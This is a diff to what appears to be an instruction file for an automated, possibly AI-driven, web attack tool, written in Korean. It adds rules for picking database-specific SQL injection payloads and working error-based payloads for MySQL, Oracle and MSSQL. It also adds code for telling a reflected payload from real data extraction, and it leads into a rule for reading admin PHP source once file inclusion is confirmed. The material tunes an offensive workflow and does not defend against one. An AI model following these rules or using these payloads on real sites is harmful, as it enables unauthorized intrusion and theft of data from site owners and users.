@@ -2988,6 +2988,64 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
       - 각 사이트별로 독립적으로 DB 타입을 결정한다
       - Oracle은 위 STEP 3 조건 충족 시에만 추가
 
+  [STEP 6] DB별 전용 함수 구분 — 혼용 금지 (v3.2.39 보완)
+    아래 함수/문법은 특정 DB 전용이다. 절대로 혼용하지 않는다:
+
+    MySQL 전용 함수 (Oracle에 절대 사용 금지):
+      UPDATEXML()     ← MySQL 에러 주입 전용
+      EXTRACTVALUE()  ← MySQL 에러 주입 전용
+      GROUP_CONCAT()  ← MySQL 전용
+      SLEEP()         ← MySQL 시간 기반 전용
+      INFORMATION_SCHEMA ← MySQL/MariaDB 전용
+
+    Oracle 전용 함수/테이블 (MySQL에 절대 사용 금지):
+      v$version       ← Oracle 시스템 테이블
+      dual            ← Oracle 가상 테이블 (SELECT 1 FROM dual)
+      ROWNUM          ← Oracle 행 번호
+      NVL()           ← Oracle NULL 처리 함수
+      UTL_HTTP        ← Oracle 외부 요청 패키지
+      DBMS_PIPE       ← Oracle 시간 기반 전용
+
+    MSSQL 전용:
+      WAITFOR DELAY   ← MSSQL 시간 기반 전용
+      xp_cmdshell     ← MSSQL 명령 실행
+      OPENROWSET      ← MSSQL 외부 연결
+      @@version       ← MSSQL/MySQL 공용이나 포맷 다름
+
+    WRONG — MySQL 함수를 Oracle 공격에 사용:
+      # UPDATEXML은 MySQL 함수. Oracle 주입에 쓰면 안 됨
+      payload = "UPDATEXML(1,(SELECT banner FROM v$version WHERE ROWNUM=1),1)"
+      # 이 페이로드는 어떤 DB에도 정상 작동하지 않음
+
+    CORRECT — DB 타입별 전용 페이로드 사용:
+      if db_type == "MySQL":
+          payload = "UPDATEXML(1,CONCAT(0x7e,version()),1)"
+      elif db_type == "Oracle":
+          payload = "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
+      elif db_type == "MSSQL":
+          payload = "' AND 1=CONVERT(int,(SELECT @@version))--"
+
+  [STEP 7] HTML 엔티티 반사 오인 차단 (v3.2.39 보완)
+    주입 후 응답에서 다음 패턴이 보이면 SQL이 실행된 것이 아니라
+    페이로드가 그대로 반사(echo)된 것이다:
+
+      &#39;   →  ' (단순 HTML 인코딩된 작은따옴표)
+      &amp;  →  &
+      &lt;   →  <
+      &gt;   →  >
+
+    WRONG — 반사된 페이로드를 추출 성공으로 오인:
+      응답: "&#39;,(SELECT banner FROM v$version WHERE ROWNUM=1),&#39;"
+      판단: "Oracle 버전 추출 성공!"  ← 완전히 틀림, 페이로드 그대로 반사된 것
+
+    CORRECT — 반사 판별:
+      if "&#39;" in response.text and "SELECT" in response.text:
+          print("⚠️ 페이로드 반사(HTML 엔티티) 감지 — SQL 실행 안 됨")
+          print("   → WAF 또는 입력값 HTML 인코딩 중 → 다른 기법으로 전환")
+          # Oracle 확인 불가 → Oracle 공격 금지
+      # 진짜 추출 성공은 반드시 DB 고유 데이터(버전 문자열, 테이블명 등)가 나와야 함
+      # 예: "8.0.32-MySQL Community Server", "ORA-01722", "Microsoft SQL Server 2019"
+
   ── RULE 26-AL [v3.2.37]: LFI 확인 후 admin 패널 PHP 소스 강제 읽기 + 로그인 검증 ──
 
   ▸ RULE 26-AL [v3.2.37]: LFI(임의 파일 읽기)가 확인된 즉시 아래 단계를 반드시 병렬로 실행한다.
